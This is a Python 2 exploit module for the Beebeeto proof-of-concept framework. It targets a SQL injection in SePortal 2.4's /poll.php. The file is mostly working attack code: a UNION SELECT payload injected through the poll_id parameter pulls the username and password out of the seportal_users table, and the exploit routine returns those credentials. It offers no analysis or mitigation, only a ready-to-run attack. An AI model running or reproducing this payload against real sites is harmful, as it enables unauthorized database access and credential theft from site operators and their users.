#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0141',
            'name': 'SePortal 2.4 /poll.php SQL注入漏洞 POC & Exploit',
            'author': '小马甲',
            'create_date': '2014-11-08',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'SePortal',
            'vul_version': ['2.4'],
            'type': 'SQL Injection',
            'tag': ['SePortal漏洞', 'SQL注入漏洞', '/poll.php', 'php'],
            'desc': 'N/A',
            'references': ['http://sebug.net/vuldb/ssvid-8867',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = ('1\'%20union%20select%201,convert(concat_ws(0x3a3a,0x3A3A33763537,user_name,user_password,'
                  '0x616536393A3A)+using+latin1),1,1,1,1,1,1,1,1%20from%20seportal_users%20limit%201,1--%20z')
        verify_url = args['options']['target'] + '/poll.php?poll_id=' + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        u_p = re.findall('::3v57::(.*?)::(.*?)::ae69::', content)
        if u_p:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    @classmethod
    def exploit(cls, args):
        payload = ('1\'%20union%20select%201,convert(concat_ws(0x3a3a,0x3A3A33763537,user_name,user_password,'
                  '0x616536393A3A)+using+latin1),1,1,1,1,1,1,1,1%20from%20seportal_users%20limit%201,1--%20z')
        verify_url = args['options']['target'] + '/poll.php?poll_id=' + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        u_p = re.findall('::3v57::(.*?)::(.*?)::ae69::', content)
        if u_p:
            (username,password) = u_p[0]
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['DBInfo'] = {}
            args['poc_ret']['DBInfo']['Username'] = username
            args['poc_ret']['DBInfo']['Password'] = password
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())